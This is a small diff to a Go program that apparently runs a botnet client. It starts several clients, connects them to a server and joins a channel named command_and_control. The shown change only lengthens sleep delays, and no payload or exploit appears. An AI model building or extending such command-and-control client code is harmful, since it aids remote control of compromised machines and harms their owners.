@@ -129,7 +129,9 @@ func main() {
     clients[i] = NewClient(server,port,db)
     client := clients[i]
 
+    time.Sleep(time.Duration(time.Second * 10))
     client.Connect()
+
     client.Run()
     <- client.Ready
 
@@ -137,7 +139,7 @@ func main() {
     client.Nick()
     client.Join(command_and_control)
 
-    time.Sleep(time.Duration(time.Second * 3))
+    time.Sleep(time.Duration(time.Second * 10))
     defer client.Conn.Close()
 
   }
